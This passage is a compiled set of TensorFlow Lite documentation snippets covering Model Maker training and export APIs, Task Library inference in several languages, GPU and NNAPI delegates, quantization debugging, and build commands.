tflite_model_maker.recommendation.create(
    train_data,
    model_spec: tflite_model_maker.recommendation.ModelSpec,
    model_dir: str = None,
    validation_data=None,
    batch_size: int = 16,
    steps_per_epoch: int = 10000,
    epochs: int = 1,
    learning_rate: float = 0.1,
    gradient_clip_norm: float = 1.0,
    shuffle: bool = True,
    do_train: bool = True
)
```

----------------------------------------

TITLE: Creating/Training Question Answer Model (Python)
DESCRIPTION: This snippet shows the signature for the `create` class method in `tflite_model_maker.question_answer`. It's used to set up and train a question answering model by taking training data (`train_data`), a model specification (`model_spec`), and optional parameters for training control like `batch_size`, `epochs`, `steps_per_epoch`, `shuffle`, and `do_train`. It returns an instance of the trained or configured model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/create.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
tflite_model_maker.question_answer.create(
    train_data,
    model_spec,
    batch_size=None,
    epochs=2,
    steps_per_epoch=None,
    shuffle=False,
    do_train=True
)
```

----------------------------------------

TITLE: Getting Default Quantization Config in TensorFlow Lite
DESCRIPTION: Provides the standard configuration settings recommended for quantizing the text model for deployment with TensorFlow Lite. This is used to prepare the model for smaller size and faster inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_6

LANGUAGE: python
CODE:
```
get_default_quantization_config()

```

----------------------------------------

TITLE: Initialize and Run Inference with BertQuestionAnswerer (Java)
DESCRIPTION: This Java snippet demonstrates how to initialize the `BertQuestionAnswerer` from a model file with specified options (like number of threads) and then run inference by providing the context passage and the question.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_question_answerer.md#_snippet_1

LANGUAGE: java
CODE:
```
// Initialization
BertQuestionAnswererOptions options =
    BertQuestionAnswererOptions.builder()
        .setBaseOptions(BaseOptions.builder().setNumThreads(4).build())
        .build();
BertQuestionAnswerer answerer =
    BertQuestionAnswerer.createFromFileAndOptions(
        androidContext, modelFile, options);

// Run inference
List<QaAnswer> answers = answerer.answer(contextOfTheQuestion, questionToAsk);
```

----------------------------------------

TITLE: Including TFLite C API Header in C/Objective-C
DESCRIPTION: Includes the main header file for the TensorFlow Lite C API. This header provides access to the core C functions required for loading models, configuring the interpreter, running inference, and managing tensors when using the low-level C interface.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_12

LANGUAGE: C
CODE:
```
#include "tensorflow/lite/c/c_api.h"
```

----------------------------------------

TITLE: Initializing MobileBertQaSquadSpec in Python
DESCRIPTION: This snippet shows the constructor signature for the `MobileBertQaSquadSpec` class. It is used to create a configuration object specifying how to build and train a question answering model using a MobileBert model pre-trained on SQuAD 1.1. Parameters allow customization of the model source, sequence lengths, learning rate, and distribution strategy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/MobileBertQaSquadSpec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.question_answer.MobileBertQaSquadSpec(
    *,
    uri='https://tfhub.dev/google/mobilebert/uncased_L-24_H-128_B-512_A-4_F-4_OPT/squadv1/1',
    model_dir=None,
    seq_len=384,
    query_len=64,
    doc_stride=128,
    dropout_rate=0.1,
    initializer_range=0.02,
    learning_rate=4e-05,
    distribution_strategy='off',
    num_gpus=-1,
    tpu='',
    trainable=True,
    predict_batch_size=8,
    do_lower_case=True,
    is_tf2=False,
    tflite_input_name=None,
    tflite_output_name=None,
    init_from_squad_model=True,
    default_batch_size=32,
    name='MobileBert'
)
```

----------------------------------------

TITLE: Creating EfficientNet-Lite3 Model Spec (Python)
DESCRIPTION: This snippet shows the Python signature for the `EfficientNetLite3Spec` constructor or function. It is used to create a configuration object specifying the parameters for loading or building an EfficientNet-Lite3 model compatible with TensorFlow Lite Model Maker. Key parameters include the URI of the pretrained model, compatible TensorFlow versions, the expected input image dimensions, and an optional name for the specification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/EfficientNetLite3Spec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.image_classifier.EfficientNetLite3Spec(
    *,
    uri='https://tfhub.dev/tensorflow/efficientnet/lite3/feature-vector/2',
    compat_tf_versions=[1, 2],
    input_image_shape=[280, 280],
    name='efficientnet_lite3'
)
```

----------------------------------------

TITLE: Prepare Custom Speech Dataset in Python
DESCRIPTION: This snippet provides placeholder code for preparing a custom speech dataset. It shows how to unzip a user-provided ZIP file containing audio samples and specify the root directory path for the unzipped dataset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
if use_custom_dataset:
  # Specify the ZIP file you uploaded:
  !unzip YOUR-FILENAME.zip
  # Specify the unzipped path to your custom dataset
  # (this path contains all the subfolders with classification names):
  dataset_dir = './YOUR-DIRNAME'
```

----------------------------------------

TITLE: Splitting Data Loader Dataset - Python
DESCRIPTION: Divides the dataset currently held by the data loader instance into two smaller data loaders. The size of the first resulting dataset is determined by the specified fraction of the original dataset's size. This is useful for creating train and validation subsets from an already loaded dataset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/DataLoader.md#_snippet_7

LANGUAGE: python
CODE:
```
split(
    fraction
)
```

----------------------------------------

TITLE: Selecting TensorFlow Lite Delegate Options - Kotlin
DESCRIPTION: Configures the `BaseOptions.Builder` to include the selected hardware acceleration delegate, such as NNAPI, based on the value of the `currentDelegate` variable using a `when` expression.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_6

LANGUAGE: Kotlin
CODE:
```
val baseOptionsBuilder = BaseOptions.builder()
when (currentDelegate) {
   DELEGATE_CPU -> {
       // Default
   }
   DELEGATE_NNAPI -> {
       baseOptionsBuilder.useNnapi()
   }
}
```

----------------------------------------

TITLE: Exporting Recommendation Model - TensorFlow Model Maker Python
DESCRIPTION: This method converts and exports the trained model into various formats suitable for deployment, such as TFLite, SavedModel, labels, vocab, and TFJS. Users can specify the output directory, filenames, and desired export formats. Additional quantization configurations can be passed via keyword arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/Recommendation.md#_snippet_6

LANGUAGE: Python
CODE:
```
export(
    export_dir,
    tflite_filename='model.tflite',
    label_filename='labels.txt',
    vocab_filename='vocab.txt',
    saved_model_filename='saved_model',
    tfjs_folder_name='tfjs',
    export_format=None,
    **kwargs
)
```

----------------------------------------

TITLE: Import TFLite Module (Objective-C)
DESCRIPTION: Imports the TensorFlowLite module into an Objective-C source file using the modern `@import` syntax, requiring module support to be enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_11

LANGUAGE: Objective-C
CODE:
```
@import TFLTensorFlowLite;
```

----------------------------------------

TITLE: Configure TFLite Build with OpenCL GPU Delegate (CMake)
DESCRIPTION: Configures the TensorFlow Lite build using CMake to enable support for the experimental OpenCL GPU delegate. This allows TFLite to leverage GPU acceleration on target machines with OpenCL support, by setting the `-DTFLITE_ENABLE_GPU=ON` flag.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_16

LANGUAGE: sh
CODE:
```
cmake ../tensorflow_src/tensorflow/lite -DTFLITE_ENABLE_GPU=ON
```

----------------------------------------

TITLE: Invoking TensorFlow Lite Micro Interpreter (C++)
DESCRIPTION: Calls the `Invoke()` method on the `tflite::MicroInterpreter` instance to run model inference. Checks the returned `TfLiteStatus` to determine if the invocation was successful, reporting an error if it fails.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_14

LANGUAGE: C++
CODE:
```
TfLiteStatus invoke_status = interpreter.Invoke();
if (invoke_status != kTfLiteOk) {
  TF_LITE_REPORT_ERROR(error_reporter, "Invoke failed\n");
}
```

----------------------------------------

TITLE: Converting Landmarks to Pose Embedding - Python
DESCRIPTION: Defines a set of functions to preprocess pose landmarks for classification. This includes calculating the pose center, determining a pose size, normalizing the landmarks by centering and scaling, and finally flattening the 2D coordinates into a 1D feature vector (embedding).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
def get_center_point(landmarks, left_bodypart, right_bodypart):
  """Calculates the center point of the two given landmarks."""

  left = tf.gather(landmarks, left_bodypart.value, axis=1)
  right = tf.gather(landmarks, right_bodypart.value, axis=1)
  center = left * 0.5 + right * 0.5
  return center


def get_pose_size(landmarks, torso_size_multiplier=2.5):
  """Calculates pose size.

  It is the maximum of two values:
    * Torso size multiplied by `torso_size_multiplier`
    * Maximum distance from pose center to any pose landmark
  """
  # Hips center
  hips_center = get_center_point(landmarks, BodyPart.LEFT_HIP, 
                                 BodyPart.RIGHT_HIP)

  # Shoulders center
  shoulders_center = get_center_point(landmarks, BodyPart.LEFT_SHOULDER,
                                      BodyPart.RIGHT_SHOULDER)

  # Torso size as the minimum body size
  torso_size = tf.linalg.norm(shoulders_center - hips_center)

  # Pose center
  pose_center_new = get_center_point(landmarks, BodyPart.LEFT_HIP, 
                                 BodyPart.RIGHT_HIP)
  pose_center_new = tf.expand_dims(pose_center_new, axis=1)
  # Broadcast the pose center to the same size as the landmark vector to
  # perform substraction
  pose_center_new = tf.broadcast_to(pose_center_new,
                                    [tf.size(landmarks) // (17*2), 17, 2])

  # Dist to pose center
  d = tf.gather(landmarks - pose_center_new, 0, axis=0,
                name="dist_to_pose_center")
  # Max dist to pose center
  max_dist = tf.reduce_max(tf.linalg.norm(d, axis=0))

  # Normalize scale
  pose_size = tf.maximum(torso_size * torso_size_multiplier, max_dist)

  return pose_size


def normalize_pose_landmarks(landmarks):
  """Normalizes the landmarks translation by moving the pose center to (0,0) and
  scaling it to a constant pose size.
  """
  # Move landmarks so that the pose center becomes (0,0)
  pose_center = get_center_point(landmarks, BodyPart.LEFT_HIP, 
                                 BodyPart.RIGHT_HIP)
  pose_center = tf.expand_dims(pose_center, axis=1)
  # Broadcast the pose center to the same size as the landmark vector to perform
  # substraction
  pose_center = tf.broadcast_to(pose_center, 
                                [tf.size(landmarks) // (17*2), 17, 2])
  landmarks = landmarks - pose_center

  # Scale the landmarks to a constant pose size
  pose_size = get_pose_size(landmarks)
  landmarks /= pose_size

  return landmarks


def landmarks_to_embedding(landmarks_and_scores):
  """Converts the input landmarks into a pose embedding."""
  # Reshape the flat input into a matrix with shape=(17, 3)
  reshaped_inputs = keras.layers.Reshape((17, 3))(landmarks_and_scores)

  # Normalize landmarks 2D
  landmarks = normalize_pose_landmarks(reshaped_inputs[:, :, :2])

  # Flatten the normalized landmark coordinates into a vector
  embedding = keras.layers.Flatten()(landmarks)

  return embedding
```

----------------------------------------

TITLE: Initializing ObjectDetector Class Instance (Python)
DESCRIPTION: Initializes an instance of the `ObjectDetector` class. This constructor sets up the object detector with a specific model specification, a mapping of label IDs to names, and optionally representative data for quantization. It requires the model specification and label map for basic instantiation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.object_detector.ObjectDetector(
    model_spec: <a href="../../tflite_model_maker/object_detector/EfficientDetSpec"><code>tflite_model_maker.object_detector.EfficientDetSpec</code></a>,
    label_map: Dict[int, str],
    representative_data: Optional[<a href="../../tflite_model_maker/object_detector/DataLoader"><code>tflite_model_maker.object_detector.DataLoader</code></a>] = None
) -> None
```

----------------------------------------

TITLE: Defining Fused Operation Interface with tf.function Python
DESCRIPTION: This Python snippet demonstrates how to wrap a composite operation within a `tf.function` using the `experimental_implements` attribute to define an interface for TFLite custom op conversion. The `implements_signature` specifies the custom op name and attributes like `tfl_fusable_op` set to true. A `tf.Module` example shows how this function is used within a model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/operation_fusion.md#_snippet_0

LANGUAGE: python
CODE:
```
def get_implements_signature():
  implements_signature = [
    # 'name' will be used as a name for the operation.
    'name: "my_custom_fused_op"',
    # attr "tfl_fusable_op" is required to be set with true value.
    'attr {key: "tfl_fusable_op" value { b: true } }',
    # Example attribute "example_option" that the op accepts.
    'attr {key: "example_option" value { i: %d } }' % 10
  ]
  return ' '.join(implements_signature)

@tf.function(experimental_implements=get_implements_signature())
def my_custom_fused_op(input_1, input_2):
  # An empty function that represents pre/post processing example that
  # is not represented as part of the Tensorflow graph.
  output_1 = tf.constant(0.0, dtype=tf.float32, name='first_output')
  output_2 = tf.constant(0.0, dtype=tf.float32, name='second_output')
  return output_1, output_2

class TestModel(tf.Module):
  def __init__(self):
    super(TestModel, self).__init__()
    self.conv_1 = tf.keras.layers.Conv2D(filters=1, kernel_size=(3, 3))
    self.conv_2 = tf.keras.layers.Conv2D(filters=1, kernel_size=(3, 3))

  @tf.function(input_signature=[
      tf.TensorSpec(shape=[1, 28, 28, 3], dtype=tf.float32),
      tf.TensorSpec(shape=[1, 28, 28, 3], dtype=tf.float32),
  ])
  def simple_eval(self, input_a, input_b):
    return my_custom_fused_op(self.conv_1(input_a), self.conv_2(input_b))
```

----------------------------------------

TITLE: Create ImageSegmenter from Options - Python
DESCRIPTION: A class method that creates an `ImageSegmenter` instance using a pre-configured `ImageSegmenterOptions` object. This allows for more control over the segmenter's behavior, such as specifying input/output tensor handling. It returns a new `ImageSegmenter` object or raises `ValueError`/`RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSegmenter.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: tflite_support.task.vision.ImageSegmenterOptions
) -> 'ImageSegmenter'
```

----------------------------------------

TITLE: Initializing ModelHParams Class - Python
DESCRIPTION: Initializes the `ModelHParams` class with parameters for configuring a recommendation model's architecture. Requires specifications for hidden layer dimensions, evaluation top-k, convolutional layer properties, LSTM units, and an optional number of predictions with a default value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/spec/ModelHParams.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.recommendation.spec.ModelHParams(
    hidden_layer_dims,
    eval_top_k,
    conv_num_filter_ratios,
    conv_kernel_size,
    lstm_num_units,
    num_predictions=attr_dict[\'num_predictions\'].default
)
```

----------------------------------------

TITLE: Incorrect Use of tf.TensorArray (Side Effect)
DESCRIPTION: Unlike `tf.Variable`, `tf.TensorArray` is immutable and does not support in-place side effects like `write()`. Calling a method like `write` without assigning the result to a variable is an incorrect usage pattern and will raise an error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_13

LANGUAGE: python
CODE:
```
def change(ta):
  ta.write(0, 1)  # Incorrect use of TensorArray - will raise an error
```

----------------------------------------

TITLE: Build TensorFlow Lite Demo for Desktop
DESCRIPTION: Builds the TensorFlow Lite C++ label_image example for desktop platforms (Ubuntu, OS X) using Bazel. The '-c opt' flag specifies an optimized release build.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_1

LANGUAGE: shell
CODE:
```
bazel build -c opt //tensorflow/lite/examples/label_image:label_image
```

----------------------------------------

TITLE: Retrieving Serving Keras Model - TensorFlow Model Maker Python
DESCRIPTION: This method provides access to the internal Keras model that is suitable for performing inferences or serving predictions. It requires no arguments and returns the Keras model object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/Recommendation.md#_snippet_3

LANGUAGE: Python
CODE:
```
create_serving_model()
```

----------------------------------------

TITLE: Splitting Dataset with AudioDataLoader (Python)
DESCRIPTION: Splits the current dataset held by the `AudioDataLoader` into two distinct sub-datasets based on a specified fraction. This method is primarily used for dividing the dataset into training and testing portions. It takes a single float argument, `fraction`, which determines the proportion of the original data allocated to the first returned dataset. Returns a tuple containing the two resulting sub-datasets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/DataLoader.md#_snippet_4

LANGUAGE: python
CODE:
```
split(
    fraction
)
```

----------------------------------------

TITLE: Generating TFLite Debug Model (Whole Model Verify) (Python)
DESCRIPTION: Uses the internal `convert.mlir_quantize` API to generate a quantization debug model from a calibrated model. It enables numeric verification (`enable_numeric_verify`) and switches to the 'whole model verify' mode (`enable_whole_model_verify`), where the float and quantized models are run independently.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_26

LANGUAGE: python
CODE:
```
# Note that enable_numeric_verify and enable_whole_model_verify are set.
quantized_model = convert.mlir_quantize(
    calibrated_model,
    enable_numeric_verify=True,
    enable_whole_model_verify=True)
debugger = tf.lite.experimental.QuantizationDebugger(
    quant_debug_model_content=quantized_model,
    debug_dataset=representative_dataset(ds))
```

----------------------------------------

TITLE: Performing TFLite Image Search Python
DESCRIPTION: Executes the image search operation on a given input image. It extracts features from the image (or a specified bounding box) and then performs a nearest-neighbor search in the configured index. Returns a SearchResult object containing the search outcomes or raises an error on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSearcher.md#_snippet_4

LANGUAGE: Python
CODE:
```
search(
    image: tflite_support.task.vision.TensorImage,
    bounding_box: Optional[tflite_support.task.processor.BoundingBox] = None
) -> tflite_support.task.processor.SearchResult
```

----------------------------------------

TITLE: Getting Output Tensor Details TensorFlow Lite Python
DESCRIPTION: Retrieves a list of dictionaries, with each dictionary containing detailed information about one of the model's output tensors. The structure and available fields in these dictionaries are identical to those returned by the `get_input_details()` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_6

LANGUAGE: python
CODE:
```
get_output_details()
```

----------------------------------------

TITLE: Export JAX to TF SavedModel with Pre/Post Processing Python
DESCRIPTION: This Python code uses `orbax.export` to export the JAX model to a TensorFlow SavedModel. It wraps the JAX model function in `JaxModule`, defines a `ServingConfig` that specifies the input signature (raw image shape) and includes the custom TensorFlow `resnet_image_processor` as a preprocessor and a simple argmax as a postprocessor. The `ExportManager` then saves the model with these integrated pre/post-processing steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
from orbax.export import ExportManager, JaxModule, ServingConfig

# Wrap the model params and function into a JaxModule.
jax_module = JaxModule({}, jax_model.apply, trainable=False)

# Specify the serving configuration and export the model.
serving_config = ServingConfig(
    "serving_default",
    input_signature=[tf.TensorSpec([480, 640, 3], tf.float32, name="inputs")],
    tf_preprocessor=resnet_image_processor,
    tf_postprocessor=lambda x: tf.argmax(x, axis=-1),
)

export_manager = ExportManager(jax_module, [serving_config])

saved_model_dir = "resnet50_saved_model"
export_manager.save(saved_model_dir)
```

----------------------------------------

TITLE: Iterating tf.data.Dataset with AutoGraph for loop Python
DESCRIPTION: Illustrates AutoGraph's conversion of a `for` loop over a `tf.data.Dataset` into `tf.data.Dataset.reduce` operations when no `break` or `return` statements are present.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_22

LANGUAGE: Python
CODE:
```
for i in tf.data.Dataset.range(3):
  tf.print('iteration:', i)
```

----------------------------------------

TITLE: Initializing TFLite Interpreter with NNAPI Delegate (Kotlin)
DESCRIPTION: Initializes a TensorFlow Lite Interpreter in Kotlin, optionally adding an NnApiDelegate for acceleration on Android Pie (API 28) or above. Includes a helper function to load the TFLite model from assets and demonstrates releasing resources.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/nnapi.md#_snippet_1

LANGUAGE: kotlin
CODE:
```
import android.content.res.AssetManager
import org.tensorflow.lite.Interpreter
import org.tensorflow.lite.nnapi.NnApiDelegate
import java.io.FileInputStream
import java.io.IOException
import java.nio.MappedByteBuffer
import java.nio.channels.FileChannel
...

val options = Interpreter.Options()
var nnApiDelegate: NnApiDelegate? = null
// Initialize interpreter with NNAPI delegate for Android Pie or above
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
    nnApiDelegate = NnApiDelegate()
    options.addDelegate(nnApiDelegate)
}
val assetManager = assets

// Initialize TFLite interpreter
val tfLite: Interpreter
try {
    tfLite = Interpreter(loadModelFile(assetManager, "model.tflite"), options)
} catch (e: Exception) {
    throw RuntimeException(e)
}

// Run inference
// ...

// Unload delegate
tfLite.close()
nnApiDelegate?.close()

...

@Throws(IOException::class)
private fun loadModelFile(assetManager: AssetManager, modelFilename: String): MappedByteBuffer {
    val fileDescriptor = assetManager.openFd(modelFilename)
    val inputStream = FileInputStream(fileDescriptor.fileDescriptor)
    val fileChannel = inputStream.channel
    val startOffset = fileDescriptor.startOffset
    val declaredLength = fileDescriptor.declaredLength
    return fileChannel.map(FileChannel.MapMode.READ_ONLY, startOffset, declaredLength)
}

...
```

----------------------------------------

TITLE: Configuring MetalDelegate Options (Objective-C)
DESCRIPTION: Shows how to initialize and configure `TFLMetalDelegateOptions` explicitly in Objective-C by setting properties and then creating the delegate. It also shows the equivalent simple initialization using default options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_6

LANGUAGE: Objective-C
CODE:
```
// THIS:
TFLMetalDelegateOptions* options = [[TFLMetalDelegateOptions alloc] init];
options.precisionLossAllowed = false;
options.waitType = TFLMetalDelegateThreadWaitTypePassive;
options.quantizationEnabled = true;

TFLMetalDelegate* delegate = [[TFLMetalDelegate alloc] initWithOptions:options];

// IS THE SAME AS THIS:
TFLMetalDelegate* delegate = [[TFLMetalDelegate alloc] init];
```

----------------------------------------

TITLE: Exporting TFLite Searcher Model (Python)
DESCRIPTION: Exports the trained Searcher model to a TensorFlow Lite file format (.tflite). This saves the model structure, ScaNN index, and embedded data to a file that can be easily deployed and used for inference on various platforms.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_searcher.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
model.export(
      export_filename="searcher.tflite",
      userinfo="",
      export_format=searcher.ExportFormat.TFLITE)
```

----------------------------------------

TITLE: Creating BertQuestionAnswerer From File - Python
DESCRIPTION: This class method creates an instance of `BertQuestionAnswerer` by loading a TensorFlow Lite model from the specified file path. It returns the initialized `BertQuestionAnswerer` object or raises `ValueError`/`RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertQuestionAnswerer.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'BertQuestionAnswerer'
```

----------------------------------------

TITLE: Creating C++ Task API Factory Function
DESCRIPTION: This C++ snippet demonstrates how to implement a static factory function, such as `CreateBertQuestionAnswerer`, to facilitate the creation of a custom Task API instance. It leverages the `TaskAPIFactory` utility class to handle the standard initialization process from a model file, including setting up the TFLite interpreter. The factory function can also include model-specific initialization steps, like loading auxiliary files such as a vocabulary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_3

LANGUAGE: C++
CODE:
```
class BertQuestionAnswerer : public BaseTaskApi<
                                  std::vector<QaAnswer>, // OutputType
                                  const std::string&, const std::string& // InputTypes
                                  > {
      // Factory function to create the API instance
      StatusOr<std::unique_ptr<QuestionAnswerer>>
      BertQuestionAnswerer::CreateBertQuestionAnswerer(
          const std::string& path_to_model, // model to passed to TaskApiFactory
          const std::string& path_to_vocab  // additional model specific files
      ) {
        // Creates an API object by calling one of the utils from TaskAPIFactory
        std::unique_ptr<BertQuestionAnswerer> api_to_init;
        ASSIGN_OR_RETURN(
            api_to_init,
            core::TaskAPIFactory::CreateFromFile<BertQuestionAnswerer>(
                path_to_model,
                absl::make_unique<tflite::ops::builtin::BuiltinOpResolver>(),
                kNumLiteThreads));

        // Perform additional model specific initializations
        // In this case building a vocabulary vector from the vocab file.
        api_to_init->InitializeVocab(path_to_vocab);
        return api_to_init;
      }
    }
```

----------------------------------------

TITLE: Creating Dynamic Range Quantization Config Python
DESCRIPTION: Creates a configuration object pre-set for dynamic range quantization. This is a convenience class method that simplifies the process of setting up dynamic range quantization without requiring specific parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/config/QuantizationConfig.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
for_dynamic()
```

----------------------------------------

TITLE: Initialize and Run Image Searcher Python
DESCRIPTION: Demonstrates initializing the TensorFlow Lite ImageSearcher in Python. It shows importing the necessary module, creating the searcher instance from a model file, loading an image using TensorImage, and performing a search operation on the loaded image.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_searcher.md#_snippet_4

LANGUAGE: Python
CODE:
```
from tflite_support.task import vision

# Initialization
image_searcher = vision.ImageSearcher.create_from_file(model_path)

# Run inference
image = vision.TensorImage.create_from_file(image_file)
result = image_searcher.search(image)
```

----------------------------------------

TITLE: Adjusting Model Spec Parameter - Python
DESCRIPTION: Retrieves a specific model specification ('mobilebert_qa') and modifies a parameter (`seq_len`) before model creation or training. This allows customization of the model architecture parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
new_spec = model_spec.get('mobilebert_qa')
new_spec.seq_len = 512
```

----------------------------------------

TITLE: Initializing TensorFlow Lite ImageSegmenterOptions Python
DESCRIPTION: Documents the constructor signature for the `ImageSegmenterOptions` class. It specifies the required `base_options` parameter (an instance of `tflite_support.task.core.BaseOptions`) and the optional `segmentation_options` parameter (an instance of `tflite_support.task.processor.SegmentationOptions`) used to configure the image segmentation task.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSegmenterOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.vision.ImageSegmenterOptions(
    base_options: <a href="../../../tflite_support/task/core/BaseOptions"><code>tflite_support.task.core.BaseOptions</code></a>,
    segmentation_options: <a href="../../../tflite_support/task/processor/SegmentationOptions"><code>tflite_support.task.processor.SegmentationOptions</code></a> = dataclasses.field(default_factory=_SegmentationOptions)
)
```

----------------------------------------

TITLE: Add Metadata for Object Detector (Python)
DESCRIPTION: This code demonstrates creating and populating metadata for a TFLite object detection model. It sets file paths, normalization parameters, loads the model and labels, initializes an `ObjectDetectorWriter`, adds the metadata, and saves the updated model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
ObjectDetectorWriter = object_detector.MetadataWriter
_MODEL_PATH = "ssd_mobilenet_v1.tflite"
# Task Library expects label files that are in the same format as the one below.
_LABEL_FILE = "ssd_mobilenet_labels.txt"
_SAVE_TO_PATH = "ssd_mobilenet_v1_metadata.tflite"
# Normalization parameters are required when reprocessing the image. It is
# optional if the image pixel values are in the range of [0, 255] and the input
# tensor is quantized to uint8. See the introduction for normalization and
# quantization parameters below for more details.
# https://www.tensorflow.org/lite/models/convert/metadata#normalization_and_quantization_parameters)
_INPUT_NORM_MEAN = 127.5
_INPUT_NORM_STD = 127.5

# Create the metadata writer.
writer = ObjectDetectorWriter.create_for_inference(
    writer_utils.load_file(_MODEL_PATH), [_INPUT_NORM_MEAN], [_INPUT_NORM_STD],
    [_LABEL_FILE])

# Verify the metadata generated by the metadata writer.
print(writer.get_metadata_json())

# Populate the metadata into the model.
writer_utils.save_file(writer.populate(), _SAVE_TO_PATH)
```

----------------------------------------

TITLE: Evaluating TFLite Model - Python TensorFlow
DESCRIPTION: Evaluates a TensorFlow Lite model file at a specified filepath using provided data. Allows an optional postprocessing function to be applied to the model output before calculating metrics. Returns the accuracy of the TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_5

LANGUAGE: Python
CODE:
```
evaluate_tflite(
    tflite_filepath, data, postprocess_fn=None
)
```

----------------------------------------

TITLE: Add TensorFlowLiteTaskText Pod Dependency (Swift)
DESCRIPTION: Add the `TensorFlowLiteTaskText` pod to your Swift project's Podfile using CocoaPods to include the necessary TensorFlow Lite Task Text library for question answering.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_question_answerer.md#_snippet_2

LANGUAGE: swift
CODE:
```
target 'MySwiftAppWithTaskAPI' do
  use_frameworks!
